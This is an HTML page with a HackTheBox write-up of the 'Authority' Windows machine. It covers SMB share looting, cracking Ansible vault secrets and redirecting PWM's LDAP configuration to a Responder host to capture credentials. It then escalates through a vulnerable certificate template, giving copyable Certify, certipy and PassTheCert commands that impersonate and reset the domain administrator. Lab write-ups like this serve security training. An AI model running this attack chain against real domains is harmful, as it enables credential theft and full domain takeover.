<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" href="../../css/Font.css">
        <link rel="stylesheet" href="css/code.css">
        <link rel="stylesheet" href="../../css/prism.css">
        <script src="../../js/prism.js"></script>
        <script src="js/copycode.js"></script>
        <script type="module"
            src="https://unpkg.com/@deckdeckgo/highlight-code@latest/dist/deckdeckgo-highlight-code/deckdeckgo-highlight-code.esm.js"></script>
    </head>
    <body>

        <pre>

            This is my write-up on one of the HackTheBox machines called Authority. Let’s go!

            <img src="../../public/images/Authority/Authority-1.png"/>

            <b>
                Initial
            </b>

            As usual, let’s start off with an Nmap scan.

            <img src="../../public/images/Authority/Authority-2.png"/>

            <img src="../../public/images/Authority/Authority-3.png"/>

            <img src="../../public/images/Authority/Authority-4.png"/>

            <img src="../../public/images/Authority/Authority-5.png"/>

            <img src="../../public/images/Authority/Authority-6.png"/>

            A Windows machine and there’s a bunch of ports open, let’s start with SMB enumeration.

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        smbclient -L \\10.10.11.222
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            <img src="../../public/images/Authority/Authority-7.png"/>

            Seems like there are two shares that we can access.

            <img src="../../public/images/Authority/Authority-8.png"/>

            We can connect but seems like we are lacking privilege in the “Department
            Shares”. Let’s try the “Development” share.

            <img src="../../public/images/Authority/Authority-9.png"/>

            It appears that Ansible services are running on the target server. Let’s
            attempt to download everything and analyze the files and folders on our
            server using the following link.

            <img src="../../public/images/Authority/Authority-10.png"/>

            <img src="../../public/images/Authority/Authority-11.png"/>

            I analyzed the files and folders and discovered Ansible credentials and Tomcat credentials.

            <img src="../../public/images/Authority/Authority-12.png"/>

            <img src="../../public/images/Authority/Authority-13.png"/>

            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        ~/Documents/HTB/authority/Automation/Ansible/PWM/ansible_inventory:
                        1  ansible_user: administrator
                        2: ansible_password: Welcome1
                        3  ansible_port: 5985
                        4  ansible_connection: winrm

                        ~/Documents/HTB/authority/Automation/Ansible/PWM/defaults/main.yml:
                        17            3438
                        18  
                        19: pwm_admin_password: !vault |
                        20            $ANSIBLE_VAULT;1.1;AES256
                        21            31356338343963323063373435363261323563393235633365356134616261666433393263373736
                        ..
                        27  ldap_uri: ldap://127.0.0.1/
                        28  ldap_base_dn: "DC=authority,DC=htb"
                        29: ldap_admin_password: !vault |
                        30            $ANSIBLE_VAULT;1.1;AES256
                        31            63303831303534303266356462373731393561313363313038376166336536666232626461653630

                        ~/Documents/HTB/authority/Automation/Ansible/PWM/templates/tomcat-users.xml.j2:
                            5   version="1.0">
                            6  
                            7: < user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
                            8: < user username="robot" password="T0mc@tR00t" roles="manager-script"/>
                            9  
                        10  </ tomcat-users >
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

            Since we now have Tomcat credentials, I assume that there’s a Tomcat
            service running, so let’s check for web services. Port 80 is empty. There’s an
            HTTPS service on port 8443; let’s try that one.

        <img src="../../public/images/Authority/Authority-13.png"/>

        Okay, it seems like there’s a management system I’m not familiar with. You
        can try all sorts of attacks on the site, but so far, nothing has worked. I
        noticed that there’s a “pwm” directory on the URL, and I remembered that
        during the Ansible file analysis, there’s a PWM directory inside it. Not long
        after looking inside the PWM directory, I discovered some password hashes.

        <img src="../../public/images/Authority/Authority-14.png"/>

        Searching for the hash type on hashcat.net

        Let’s separate the three hashes into three different files and use ansible2john

        <img src="../../public/images/Authority/Authority-15.png"/>

        <img src="../../public/images/Authority/Authority-16.png"/>

        Now that we have the Ansible vault password, let’s decrypt it.

        <img src="../../public/images/Authority/Authority-17.png"/>

        <img src="../../public/images/Authority/Authority-18.png"/>

        Let’s assume the vault password for the PWM login is the same, as the last
        two are the same.

        <img src="../../public/images/Authority/Authority-19.png"/>

        Now that we have the credentials set for PWM, let’s try to log in.

        <img src="../../public/images/Authority/Authority-20.png"/>

        I encountered an error when I tried to log in; it said the directory is
        unavailable. Let’s investigate further. In the configuration manager menu,
        we need a password. We successfully accessed it using the
        pwm_admin_password we cracked earlier.

        <img src="../../public/images/Authority/Authority-21.png"/>

        We can download and edit the configuration, or we can edit it directly.

        <img src="../../public/images/Authority/Authority-22.png"/>

        <b>
            Foothold
        </b>

        <img src="../../public/images/Authority/Authority-23.png"/>

        If you refer to the previous screenshot, we can download the current
        configuration and import a new one. Let’s start by downloading it first to
        understand what went wrong previously and how we can address it.

        <img src="../../public/images/Authority/Authority-24.png"/>

        It seems to be attempting to connect with a non-existent service, which is
        why it says it can’t find any directory. Let’s try to make the machine connect
        to our self-hosted LDAP server. We can use Responder for this purpose, with
        the hope of obtaining the hashes or credentials and gaining initial access to the machine.

        <img src="../../public/images/Authority/Authority-25.png"/>

        Edit the configuration and change the LDAP URLs to your Responder server’s
        address, following the format from the previous configuration, which is
        ldaps://[your_ip]:398. Use port 389 because Responder hosts the LDAP
        service on that port, as indicated in netstat.

        <img src="../../public/images/Authority/Authority-26.png"/>

        <img src="../../public/images/Authority/Authority-27.png"/>

        When I attempted to click the ‘Test LDAP Profile’ button, it didn’t work. I also
        tried to test the LDAP connection by logging into the application, but it still
        didn’t work. Then I decided to change the URL to ldap://[your_ip]:398,
        removing the 's' with the assumption that it was trying to use secure LDAP.

        <img src="../../public/images/Authority/Authority-28.png"/>

        I used the credentials to access the machine with evil-winrm, and it worked!

        <img src="../../public/images/Authority/Authority-29.png"/>

        We are in.

        <b>
            Getting Root
        </b>

        It took me quite some time to find the path to root. Initially, when examining
        the privileges, we found that only a limited set of privileges were enabled.

        <img src="../../public/images/Authority/Authority-30.png"/>

        It seems like we have the privilege to add workstations/computers to the
        domain, although I’m not sure how to use that privilege.

        I also noticed an unusual directory named ‘Certs’ on the ‘C’ root directory.
        Inside, there’s a certificate called ‘LDAPs.pfx’

        <img src="../../public/images/Authority/Authority-31.png"/>

        Perhaps we need to work with certificates for privilege escalation. I decided
        to upload Certify.exe to investigate.

        <img src="../../public/images/Authority/Authority-32.png"/>


            <div class="container">
                <deckgo-highlight-code id="codeToCopy">
                    <code slot="code">
                        .\Certify.exe find /vulnerable
                    </code></deckgo-highlight-code>
                <button id="copyButton">Copy</button>
            </div>

        <img src="../../public/images/Authority/Authority-33.png"/>

        As we can see, there’s a vulnerable Certificate Template that we can use to escalate our privileges.

        <img src="../../public/images/Authority/Authority-34.png"/>

        <div class="container">
            <deckgo-highlight-code id="codeToCopy">
                <code slot="code">
                    python3 addcomputer.py -computer-name shtnx_pc -computer-pass 1234  'authority.htb/
                    < username >:< password>' -dc-ip 10.10.11.222
                </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>

        Now we can follow the steps from the article using the new machine account
        we added to the machine. First, we need to request a certificate to
        impersonate the administrator user.

        <div class="container">
            <deckgo-highlight-code id="codeToCopy">
                <code slot="code">
                    certipy req -username "shtnx_pc$" -p "1234" -dc-ip 10.10.11.222 -ca AUTHORITY-CA -upn 
                    'administrator@authority.htb' -template CorpVPN -debug
                </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>

        <img src="../../public/images/Authority/Authority-35.png"/>

        To start, we must create key and crt files using the administrator.pfx file we just generated.

        <div class="container">
            <deckgo-highlight-code id="codeToCopy">
                <code slot="code">
                    certipy cert -pfx administrator.pfx -nokey -out user.crt

                    certipy cert -pfx administrator.pfx -nocert -out user.key
                </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>

        Then, we can use this tool to pass the certificate, which can be found at
        <a href="https://github.com/AlmondOffSec/PassTheCert.git.">https://github.com/AlmondOffSec/PassTheCert.git.</a>

        <div class="container">
            <deckgo-highlight-code id="codeToCopy">
                <code slot="code">
                    python3 /opt/PassTheCert/Python/passthecert.py -crt user.crt -key user.key 
                    -dc-ip 10.10.11.222 -domain authority.htb -action whoami
                </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>

        <img src="../../public/images/Authority/Authority-36.png"/>

        We have indeed become the administrator. Now, we can either use
        ldap_shell to obtain an administrator shell on the machine or simply change
        the administrator password. I’ll opt to change the administrator password.

        <div class="container">
            <deckgo-highlight-code id="codeToCopy">
                <code slot="code">
                    python3 /opt/PassTheCert/Python/passthecert.py -crt user.crt -key user.key -dc-ip 10.10.11.222 
                    -domain authority.htb -action modify_user -target administrator -new-pass hackeD1!
                </code></deckgo-highlight-code>
            <button id="copyButton">Copy</button>
        </div>

        <img src="../../public/images/Authority/Authority-37.png"/>

        <img src="../../public/images/Authority/Authority-38.png"/>

        ROOTED!

        </pre>
    </body>